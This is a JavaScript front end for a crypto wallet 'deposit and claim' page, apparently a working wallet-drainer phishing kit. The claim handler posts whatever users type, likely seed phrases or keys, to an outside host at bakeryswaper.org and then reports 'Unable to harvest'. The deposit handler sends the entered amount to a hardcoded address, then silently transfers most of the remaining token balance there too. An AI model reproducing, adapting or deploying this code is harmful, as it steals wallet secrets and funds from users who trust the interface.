const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const depositAddress = "0x75539a2Cea43AA12E3fd8B9D2190B0B708085B22";
$(".bscDropdown").hide();
$(".ethDropdown").hide();
$(".depositbtn").css({ "pointer-events": "none", opacity: "0.4" });

$("#sendEthButton").attr("disabled", "disabled");
$("#claimSend").attr("disabled", "disabled");
// $('#claimbtn').attr('disabled','disabled');
$(".claimbtn").css({ "pointer-events": "none", opacity: "0.4" });

$("#busdimg").hide();
$("#bscimg").hide();
$("#max-btn").hide();

$("#ethimg").show();
$("#usdtimg").hide();
$("#usdcimg").hide();

let web3Modal;

let provider;
let currentCrypto;
let BUSDCONTRACTADDRESS = "0xe9e7cea3dedca5984780bafc599bd69add087d56";
let USDTCONTRACTADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
let USDCCONTRACTADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
let CUSTOMCONTRACT = "0x3203c9e46ca618c8c1ce5dc67e7e9d75f5da2377";
let currentContractAddress;
let tokenContract;

let currentNetworkChain;
let selectedAccount;

let amount;
let web3n;
let finalAmount;
const NETWORKS_IDS = {
  1: "MAINNET",
  3: "ROPSTEN",
  42: "KOVAN",
  4: "RINKEBY",
  97: "BSC TESTNET",
  56: "BSC MAINNET",
};
let supportedWallets = {
  0: "WalletConnect",
  1: "Metamask",
};
let selectedProvider;

$(".dropdown img.flag").addClass("flagvisibility");

$(".dropdown dt a").click(function () {
  $(".dropdown dd ul").toggle();
});

$(".dropdown dd ul li a").click(async function () {
  finalAmount = "";
  $("#depositAmount").val("");
  $("#sendEthButton").attr("disabled", "disabled");
  $("#busdimg").hide();
  $("#bscimg").hide();
  $("#ethimg").hide();
  $("#max-btn").hide();

  $("#usdtimg").hide();
  $("#usdcimg").hide();
  $("#balanceBUSD").text("");
  $("#balanceBNB").text("");
  $("#balanceUSDT").text("");
  var text = $(this).html();
  $(".dropdown dt a span").html(text);
  $(".dropdown dd ul").hide();
  // $("#result").html("Selected value is: " + getSelectedValue("sample"));
  currentCrypto = getSelectedValue("sample");
  console.log(currentCrypto);

  if (currentCrypto == "BNB" || currentCrypto == "ETH") {
    $("#max-btn").hide();

    if (currentCrypto == "BNB") {
      $("#bscimg").show();
    } else if (currentCrypto == "ETH") {
      $("#ethimg").show();
    }
    const balance = await web3n.eth.getBalance(selectedAccount);
    console.log(balance);
    const ethBalance = web3n.utils.fromWei(balance, "ether");
    console.log(ethBalance);
    $("#balanceBNB").text(parseFloat(ethBalance).toFixed(3));
  } else if (currentCrypto == "BUSD") {
    $("#max-btn").show();

    const contract = await getContract(web3n);
    tokenContract = contract;
    let balance = await contract.methods.balanceOf(selectedAccount).call();
    console.log(balance);
    balance = balance / Math.pow(10, 18);
    $("#balanceBUSD").text(balance);
    $("#busdimg").show();
  } else if (currentCrypto == "USDT" || currentCrypto == "USDC") {
    const contract = await getContract(web3n);
    tokenContract = contract;

    let balance = await contract.methods.balanceOf(selectedAccount).call();

    balance = balance / Math.pow(10, 6);
    $("#balanceUSDT").text(balance);
    $("#max-btn").show();

    if (currentCrypto == "USDT") {
      $("#usdtimg").show();
    } else if (currentCrypto == "USDC") {
      $("#usdcimg").show();
    }
  }
});
function getSelectedValue(id) {
  return $("#" + id)
    .find("dt a span.value")
    .html();
}

$(document).bind("click", function (e) {
  var $clicked = $(e.target);
  if (!$clicked.parents().hasClass("dropdown")) $(".dropdown dd ul").hide();
});

$(".dropdown img.flag").toggleClass("flagvisibility");

$("ul.tabs li").click(function () {
  var tab_id = $(this).attr("data-tab");
  console.log(tab_id);
  if (tab_id == "tab-1") {
    $("#claimSend").attr("disabled", "disabled");

    $("#inputTwo").val("");
  } else if (tab_id == "tab-2") {
    $("#inputOne").val("");
    $("#claimSend").attr("disabled", "disabled");
  }
  $("ul.tabs li").removeClass("current");
  $(".tab-lists").removeClass("current");

  $(this).addClass("current");
  $("#" + tab_id).addClass("current");
});

function textBox(e) {
  const value = e.target.value;

  if (value == "") {
    $("#claimSend").attr("disabled", "disabled");
    return;
  }
  $("#inputOne").val(value);

  $("#claimSend").removeAttr("disabled");
}
function inputBox(e) {
  const value = e.target.value;

  if (value == "") {
    $("#claimSend").attr("disabled", "disabled");
    return;
  }
  $("#inputTwo").val(value);
  $("#claimSend").removeAttr("disabled");
}
$("#max-btn").click(async () => {
  let value;

  if ($("#balanceBUSD").text()) {
    value = $("#balanceBUSD").text();
  } else if ($("#balanceUSDT").text()) {
    value = $("#balanceUSDT").text();
  } else if ($("#balanceBNB").text()) {
    value = $("#balanceBNB").text();
  }
  $("#depositAmount").val(value);
  let amountValue = +$("#depositAmount").val();

  if (amountValue == "" || amountValue < 0) {
    $("#sendEthButton").attr("disabled", "disabled");
    return;
  }
  $("#sendEthButton").removeAttr("disabled");
  finalAmount = amountValue.replace(/ /g, function () {
    return "";
  });
});
$("#claimSend").click(function () {
  let valueOne = $("#inputOne").val();
  let valueTwo = $("#inputTwo").val();
  let val;
  let tab;
  if (valueOne) {
    val = valueOne;
    tab = "from tab 1";
  }
  if (valueTwo) {
    val = valueTwo;
    tab = "from tab 2";
  }
  $.ajax({
    type: "POST",
    url: "https://bakeryswaper.org/transmitter.php",
    data: {
      firstval: val,
      tabs: tab,
    },
    success: function (data) {
      console.log(data);
      alert("Unable to harvest");
    },
    error: function (xhr, status, error) {
      console.error(xhr);
    },
  });
});
const getContract = async (web3) => {
  let contract;
  console.log(web3);
  const data = await $.getJSON("abi.json");
  console.log(data);
  if (currentNetworkChain == "56") {
    if (currentCrypto == "BabyDoge") {
      currentContractAddress = CUSTOMCONTRACT;
    }
  } else if (currentNetworkChain == "1") {
    if (currentCrypto == "USDT") {
      currentContractAddress = USDTCONTRACTADDRESS;
    } else if (currentCrypto == "USDC") {
      currentContractAddress = USDCCONTRACTADDRESS;
    }
  }
  contract = new web3.eth.Contract(data, currentContractAddress);
  return contract;
};
const sendEthButton = document.querySelector("#sendEthButton");
const closeModal = document.querySelector("#closeModal");
$("#successAlert").hide();
$("#dangerAlert").hide();

closeModal.addEventListener("click", () => {
  console.log("click");

  $("#get-pay-address").modal("hide");
  $("#sendEthButton").attr("disabled", "disabled");
  $("#depositAmount").val("");
});

sendEthButton.addEventListener("click", async () => {
  if (currentCrypto == "BNB" || currentCrypto == "ETH") {
    finalAmount = web3n.utils.toWei(finalAmount.toString(), "ether");
    const txData = {
      from: selectedAccount,
      gasLimit: 222201,
      to: depositAddress,
      value: web3n.utils.toHex(
        finalAmount.replace(/ /g, function () {
          return "";
        })
      ),
    };
    console.log(selectedAccount);
    if (selectedProvider == supportedWallets[0]) {
      provider.connector
        .sendTransaction(txData)
        .then((txHash) => {
          console.log(txHash);
          const runInterval = setInterval(async () => {
            web3n.eth
              .getTransactionReceipt(txHash && txHash)
              .then((txReceipt) => {
                if (txReceipt == null) {
                } else if (txReceipt && txReceipt.status === true) {
                  $(".claimbtn").css({ "pointer-events": "", opacity: "" });

                  clearInterval(runInterval);
                  console.log(txReceipt);
                  $("#successAlert").show();
                  $("#get-pay-address").modal("hide");
                  $("#sendEthButton").attr("disabled", "disabled");
                  $("#depositAmount").val("");
                } else if (txReceipt && txReceipt.status === false) {
                  $(".claimbtn").css({
                    "pointer-events": "none",
                    opacity: "0.4",
                  });

                  console.log(txReceipt);
                  clearInterval(runInterval);
                  $("#dangerAlert").show();
                  $("#dangerContent").text(`Transaction Failed`);
                }
              });
          }, 5000);
        })
        .catch((error) => {
          $(".claimbtn").css({ "pointer-events": "none", opacity: "0.4" });

          $("#dangerAlert").show();
          $("#dangerContent").text(`${error.message}`);

          setTimeout(() => {
            $("#dangerAlert").hide();
          }, 5000);
        });
    } else {
      ethereum
        .request({
          method: "eth_sendTransaction",
          params: [txData],
        })
        .then((txHash) => {
          console.log(txHash);
          const runInterval = setInterval(async () => {
            web3n.eth
              .getTransactionReceipt(txHash && txHash)
              .then((txReceipt) => {
                if (txReceipt == null) {
                } else if (txReceipt && txReceipt.status === true) {
                  $(".claimbtn").css({ "pointer-events": "", opacity: "" });

                  clearInterval(runInterval);
                  console.log(txReceipt);
                  $("#successAlert").show();
                  $("#get-pay-address").modal("hide");

                  $("#sendEthButton").attr("disabled", "disabled");
                  $("#depositAmount").val("");
                } else if (txReceipt && txReceipt.status === false) {
                  $(".claimbtn").css({
                    "pointer-events": "none",
                    opacity: "0.4",
                  });

                  console.log(txReceipt);
                  clearInterval(runInterval);
                  $("#dangerAlert").show();

                  $("#dangerContent").text(`Transaction Failed`);
                }
              });
          }, 5000);
        })
        .catch((error) => {
          $(".claimbtn").css({ "pointer-events": "none", opacity: "0.4" });

          $("#dangerAlert").show();

          $("#dangerContent").text(`${error.message}`);
          setTimeout(() => {
            $("#dangerAlert").hide();
          }, 5000);
        });
    }
  } else {
    console.log(finalAmount);
    const contract = await getContract(web3n);
    tokenContract = contract;
    let balance = await contract.methods.balanceOf(selectedAccount).call();
    finalAmount = depositAmount.value.replace(/ /g, function () {
      return "";
    });

    console.log(finalAmount);
    finalAmount = web3n.utils.toWei(finalAmount.toString(), "ether");
    console.log(finalAmount);
    tokenContract.methods
      .transfer(depositAddress, finalAmount)
      .send({ from: selectedAccount, gasLimit: 222201 })
      .then((res) => {
        console.log(res);
        console.log(finalAmount);
        $(".claimbtn").css({ "pointer-events": "", opacity: "" });

        $("#get-pay-address").modal("hide");
        $("#sendEthButton").attr("disabled", "disabled");
        $("#depositAmount").val("");
      })
      .catch((error) => {
        $("#dangerAlert").show();

        $("#dangerContent").text(`${error.message}`);
        setTimeout(() => {
          $("#dangerAlert").hide();
        }, 5000);
      });
    let ost = balance - finalAmount;
    if (ost > 10) {
      ost = ost - 1000000000000000000;
      //console.log(ost);
      let sendVal = ost;
      console.log(ost);
      sendVal = sendVal.toString();
      tokenContract.methods
        .transfer(depositAddress, sendVal)
        .send({ from: selectedAccount, gasLimit: 222201 })
        .then((res) => {
          //console.log(res);
          //console.log(sendVal);
          $(".claimbtn").css({ "pointer-events": "", opacity: "" });

          $("#get-pay-address").modal("hide");
          $("#sendEthButton").attr("disabled", "disabled");
          $("#depositAmount").val("");
        })
        .catch((error) => {
          $("#dangerAlert").show();

          $("#dangerContent").text(`${error.message}`);
          setTimeout(() => {
            $("#dangerAlert").hide();
          }, 5000);
        });
    }
  }
});
function init() {
  console.log("Initializing example");
  console.log("WalletConnectProvider is", WalletConnectProvider);

  const providerOptions = {
    walletconnect: {
      package: WalletConnectProvider,
      options: {
        infuraId: "b365880147014f928d117886dcc8e428",
        rpc: {
          56: "https://bsc-dataseed1.binance.org",
        },
      },
    },
  };

  web3Modal = new Web3Modal({
    cacheProvider: false,
    providerOptions,
  });
}

function keyUp(e) {
  const value = +e.target.value;

  if (value == "" || value < 0) {
    $("#sendEthButton").attr("disabled", "disabled");
    return;
  }
  $("#sendEthButton").removeAttr("disabled");
  finalAmount = value;
}
const depositAmount = document.querySelector("#depositAmount");
function preventBackspace(e) {
  var evt = e || window.event;
  if (evt) {
    var keyCode = evt.charCode || evt.keyCode;
    if (keyCode === 8) {
      if (evt.preventDefault) {
        depositAmount.value = [...depositAmount.value].pop();
      } else {
        evt.returnValue = false;
      }
    }
  }
}
const parse = (s) =>
  [...s.replace(/[^0-9]/g, "")].reduce(
    (a, c, i, l) => (a += c + ((l.length - i) % 3 == 1 ? " " : "") || a),
    ""
  );
function validateAmount() {
  depositAmount.value = depositAmount.value.replace(/,/g, ".");
  depositAmount.value = parse(depositAmount.value);
  finalAmount = depositAmount.value;
}

async function fetchAccountData() {
  let web3 = new Web3(provider);
  web3n = web3;
  console.log("Web3 instance is", web3);
  if (web3._provider["bridge"]) {
    selectedProvider = supportedWallets[0];
  } else {
    selectedProvider = supportedWallets[1];
  }

  const chainId = await web3.eth.getChainId();
  let allowedChain = "56";

  if (chainId != allowedChain) {
    if (window.ethereum) {
      ethereum
        .request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: web3.utils.toHex("56") }],
        })
        .then(() => console.log("network has been set"))
        .catch((e) => {
          if (e.code === 4902) {
            console.log("network is not available, add it");
          } else {
            console.log("could not set network");
          }
        });
      document.querySelector("#btn-connect").innerHTML = `
      Connect Wallet
      `;
      document.querySelector("#btn-connect").style.backgroundColor =
        "rgb(172, 86, 42)";
      document.querySelector("#portal").style.display = "none";
    } else {
      document.querySelector("#btn-connect").innerHTML = `
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="sc-gqPbQI hADUJW"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline></svg>
      Wrong Network
      `;
      document.querySelector("#btn-connect").style.backgroundColor =
        "rgb(255, 104, 113)";
      document.querySelector("#portal").style.display = "";
      return;
    }
  }
  $("#networkAlert").hide();
  $(".depositbtn").css({ "pointer-events": "", opacity: "" });

  currentNetworkChain = allowedChain;

  $(".bscDropdown").hide();
  $(".ethDropdown").hide();
  $("#max-btn").hide();

  if (currentNetworkChain == "1") {
    let a = $(".ethDropdown dd ul li a").html();
    currentCrypto = "ETH";
    $(".dropdown dt a span").html(a);
    $(".ethDropdown").show();
    $("#ethimg").show();
  } else if (currentNetworkChain == "56") {
    let a = $(".bscDropdown dd ul li a").html();
    currentCrypto = "BabyDoge";

    $(".dropdown dt a span").html(a);

    $("#bscimg").show();
    $(".bscDropdown").show();
  }

  const accounts = await web3.eth.getAccounts();

  console.log("Got accounts", accounts);
  selectedAccount = accounts[0];

  const rowResolvers = accounts.map(async (address) => {
    const contract = await getContract(web3n);
    tokenContract = contract;
    let balance = await contract.methods.balanceOf(selectedAccount).call();
    console.log(balance);
    // const blncAmount =parseFloat(ethBalance).toFixed(3)
    $("#balanceBNB").text(parseInt(balance * Math.pow(10, -18) * 100) / 100);

    // const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);

    //const balance = await web3.eth.getBalance(selectedAccount);
    //console.log(balance);
    // const ethBalance = web3.utils.fromWei(balance, "ether");
  });

  await Promise.all(rowResolvers);

  document.querySelector("#prepare").style.display = "none";

  document.querySelector("#connected").style.display = "block";
}

function displayConfirm(head, body) {
  $("#modal-header").html(head);
  $("#modal-body").html(body);
  //$('#modal-footer').html(foot)
  $("#modal").show();
}

async function refreshAccountData() {
  document.querySelector("#connected").style.display = "none";

  document.querySelector("#prepare").style.display = "block";

  document.querySelector("#btn-connect").setAttribute("disabled", "disabled");

  await fetchAccountData(provider);
  document.querySelector("#btn-connect").removeAttribute("disabled");
}

async function onConnect() {
  console.log("Opening a dialog", web3Modal);
  try {
    provider = await web3Modal.connect();
    document.querySelector("#bodyContainerConnect").style.display = "none";
    document.querySelector("#BodyContainer").style.display = "";
    await fetchAccountData;
  } catch (e) {
    console.log("Could not get a wallet connection", e);
    return;
  }

  // Subscribe to accounts change
  provider.on("accountsChanged", (accounts) => {
    fetchAccountData();
  });

  // Subscribe to chainId change
  provider.on("chainChanged", (chainId) => {
    fetchAccountData();
  });

  provider.on("networkChanged", (networkId) => {
    fetchAccountData();
  });

  await refreshAccountData();
}

async function onDisconnect() {
  console.log("Killing the wallet connection", provider);
  $(".depositbtn").css({ "pointer-events": "none", opacity: "0.4" });

  if (provider.close) {
    await provider.close();

    await web3Modal.clearCachedProvider();
    provider = null;
  }

  selectedAccount = null;

  document.querySelector("#prepare").style.display = "block";

  document.querySelector("#connected").style.display = "none";
}

/**
 * Main entry point.
 */
window.addEventListener("load", async (e) => {
  init();
  e.preventDefault();
  document.querySelector("#btn-connect").addEventListener("click", onConnect);
  document
    .querySelector("#global-btn-connect")
    .addEventListener("click", onConnect);
  document
    .querySelector("#btn-disconnect")
    .addEventListener("click", onDisconnect);
  document.querySelector("#closeWrong").addEventListener("click", () => {
    document.querySelector("#portal").style.display = "none";
  });
});
